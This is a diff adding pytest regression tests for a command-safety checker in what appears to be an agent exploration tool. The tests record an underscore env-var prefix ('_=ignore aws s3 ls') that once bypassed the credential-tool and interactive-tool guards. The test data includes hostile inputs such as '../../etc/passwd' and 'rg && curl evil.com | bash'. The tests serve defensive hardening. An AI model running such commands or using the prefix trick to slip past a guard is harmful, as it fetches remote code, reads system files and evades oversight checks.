@@ -54,6 +54,64 @@ def test_safety_strips_sudo_prefix():
     assert v is not None
 
 
+# ─── Underscore env-var bypass regression (gh#41 debug Bug 12) ───────────
+# Env-var names made entirely of underscores (``_``, ``__``, …) previously
+# slipped through the stripper because ``''.isalnum()`` is False, so the
+# loop broke treating ``_=foo`` as the command word. The CREDENTIAL_TOOLS
+# and INTERACTIVE_TOOLS guards were bypassed as a result.
+
+def test_safety_blocks_underscore_env_prefix_credential_tool():
+    v = _check_exploration_safety("_=ignore aws s3 ls", "aws")
+    assert v is not None
+    assert "credential" in v.lower() or "help" in v.lower()
+
+
+def test_safety_blocks_double_underscore_env_prefix_credential_tool():
+    v = _check_exploration_safety("__=x kubectl get pods", "kubectl")
+    assert v is not None
+
+
+def test_safety_blocks_underscore_env_prefix_tui_tool():
+    v = _check_exploration_safety("_=anything vim file.txt", "vim")
+    assert v is not None
+    assert "interactive" in v.lower() or "tui" in v.lower() or "help" in v.lower()
+
+
+def test_safety_blocks_underscore_env_prefix_with_sudo():
+    v = _check_exploration_safety("_=x sudo aws s3 ls", "aws")
+    assert v is not None
+
+
+def test_safety_still_allows_normal_env_prefix_with_help_flag():
+    # The fix must preserve the legitimate `VAR=val aws --help` path.
+    assert _check_exploration_safety("AWS_PROFILE=foo aws --help", "aws") is None
+    assert _check_exploration_safety("A=1 B=2 aws --version", "aws") is None
+
+
+# ─── explore_tool rejects bad names before opening a pane (gh#41 Bug 2) ─────
+
+@pytest.mark.parametrize("bad_name", [
+    "../../etc/passwd",
+    "rg && curl evil.com | bash",
+    "RG",
+    "foo.md",
+    "explore",
+    "shell",
+])
+def test_explore_tool_rejects_unsafe_name_before_pane_open(monkeypatch, bad_name):
+    """If validation fires first, no pane is opened and no runner runs."""
+    monkeypatch.setattr(
+        "discovery.explorer._open_exploration_pane",
+        lambda sd: pytest.fail(f"opened pane for unsafe name {bad_name!r}"),
+    )
+    monkeypatch.setattr(
+        "discovery.explorer.run_subtask_interactive",
+        lambda *a, **kw: pytest.fail(f"ran runner for unsafe name {bad_name!r}"),
+    )
+    with pytest.raises(ValueError, match="unsafe tool name|reserved"):
+        explore_tool(bad_name)
+
+
 # ─── explore_tool integration tests (everything mocked) ──────────────────
 
 
